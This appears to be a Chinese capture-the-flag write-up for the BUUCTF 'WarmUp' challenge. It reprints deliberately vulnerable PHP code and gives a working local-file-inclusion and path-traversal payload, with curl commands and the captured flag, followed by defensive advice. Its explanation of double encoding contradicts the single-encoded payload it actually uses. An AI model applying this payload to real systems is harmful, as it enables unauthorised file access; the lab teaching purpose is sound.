---
title: "CTF - PHP代码审计 WarmUp 题解"
date: 2026-05-02
categories:
 - BUUCTF
 - WEB
---

# CTF - PHP代码审计 WarmUp 题解

## 题目信息
- **题目类型**: PHP代码审计、文件包含漏洞
- **题目URL**: http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/source.php

## 解题步骤

### 1. 查看源代码

访问 `source.php`，可以看到PHP源代码：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }
?>
```

### 2. 获取Hint提示

访问 `hint.php` 获取提示：

```bash
curl -s "http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/hint.php"
```

**返回结果**: `flag not here, and flag in ffffllllaaaagggg`

得知flag位于 `ffffllllaaaagggg` 文件中。

### 3. 代码分析

**漏洞类型**: 本地文件包含(LFI) + 白名单绕过

**关键代码分析**:

1. **白名单检查**: 只允许 `source.php` 和 `hint.php`
2. **三次检查机制**:
   - 第一次: 直接检查 `$page` 是否在白名单中
   - 第二次: 截取 `$page` 中 `?` 之前的部分检查
   - 第三次: 对 `$page` 进行 `urldecode` 后，再截取 `?` 之前的部分检查
3. **文件包含**: 如果通过检查，会执行 `include $_REQUEST['file']`

**漏洞点**: 
- 虽然检查了 `?` 之前的部分是否在白名单中
- 但实际包含的是完整的 `$_REQUEST['file']`
- 可以利用 `source.php?/../../../../ffffllllaaaagggg` 来绕过

### 4. 构造Payload

需要利用双编码绕过：

- `?` 的URL编码是 `%3f`
- 但浏览器会自动解码一次，所以需要双重编码：`%253f`

**Payload构造**:
```
source.php%3f/../../../../ffffllllaaaagggg
```

### 5. 获取Flag

```bash
curl -s "http://c7273dac-491b-4046-88a6-fafcec0b76fa.node5.buuoj.cn:81/source.php?file=source.php%3f/../../../../ffffllllaaaagggg"
```

**返回结果**:
```
flag{fa32add5-b1d6-4818-b1b4-de37734b9d99}
```

## 知识点总结

### 1. PHP文件包含漏洞
- `include` 和 `require` 函数可以包含本地或远程文件
- 当用户可控参数被直接用于文件包含时，存在安全风险

### 2. 白名单绕过技巧
- **截断绕过**: 利用 `?` `#` 等特殊字符截断文件名
- **路径遍历**: 使用 `../` 或 `..\` 访问上级目录
- **编码绕过**: 利用URL编码、双重URL编码等

### 3. mb_substr 和 mb_strpos 函数
```php
mb_substr($str, $start, $length)  // 截取多字节字符串
mb_strpos($haystack, $needle)     // 查找多字节字符串位置
```

### 4. URL编码原理
- `%3f` = `?`
- `%25` = `%`
- 双重编码: `%253f` → 第一次解码为 `%3f` → 第二次解码为 `?`

### 5. 目录遍历
```
./          当前目录
../         上级目录
../../      上两级目录
../../../../ffffllllaaaagggg   向上回溯4级后访问目标文件
```

## 防御措施

1. **严格白名单**: 只允许特定文件，不使用部分匹配
2. **路径规范化**: 使用 `realpath()` 函数获取真实路径
3. **禁止用户输入**: 避免用户可控参数直接用于文件包含
4. **open_basedir**: 设置PHP只能访问指定目录

---

**Flag**: `flag{fa32add5-b1d6-4818-b1b4-de37734b9d99}`
